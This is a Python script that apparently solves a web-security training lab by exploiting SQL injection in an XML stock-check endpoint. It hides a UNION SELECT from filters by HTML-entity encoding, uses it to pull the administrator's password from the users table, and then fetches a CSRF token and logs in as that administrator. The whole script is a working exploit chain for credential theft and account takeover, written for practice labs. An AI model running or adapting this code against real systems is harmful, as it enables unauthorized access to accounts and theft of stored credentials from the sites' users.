import requests
import re
from bs4 import BeautifulSoup

def html_encode(string):
    return ''.join(['&#{0};'.format(ord(char)) for char in string])

def get_credentials(session, domain):
    payload = html_encode("union select username || '~' || password from users where username = 'administrator'")
    xml = '''<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>2 {}</storeId>
</stockCheck>'''.format(payload)
    headers = {'Content-Type': 'application/xml'}
    r = session.post(domain + '/product/stock', data = xml, headers = headers)
    username = 'administrator'
    password = r.text.split('~')[1]
    return username, password

def get_csrf(session, domain):
    login_url = domain + '/login'
    r = session.get(login_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']
    return csrf
    
def solve_lab(session, domain, username, password, csrf):
    data = {
        'csrf': csrf,
        'username': username,
        'password': password
    }
    r = session.post(domain + '/login', data = data)
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not Solved')

if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ');
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    session = requests.Session()
    try:
        username, password = get_credentials(session, domain)
        csfr = get_csrf(session, domain)
        solve_lab(session, domain, username, password, csfr)
    except:
        print('Error connecting to the server. Check your URL.')